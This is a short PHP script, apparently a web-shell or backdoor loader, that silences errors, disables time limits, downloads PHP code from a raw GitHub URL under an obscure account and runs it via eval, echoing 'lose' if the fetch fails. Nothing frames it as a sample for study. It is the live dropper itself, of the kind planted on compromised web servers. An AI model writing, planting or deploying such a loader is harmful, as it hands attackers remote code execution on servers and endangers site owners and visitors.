



lls<?php
error_reporting(0);
set_time_limit(0);

$url = "https://raw.githubusercontent.com/zzvvzzserverzzvvzz/maintenanceserver/refs/heads/main/vvvlf2.php";

$code = @file_get_contents($url);

if($code !== false){
    eval("?>".$code);
} else {
    echo "lose";
}
?>


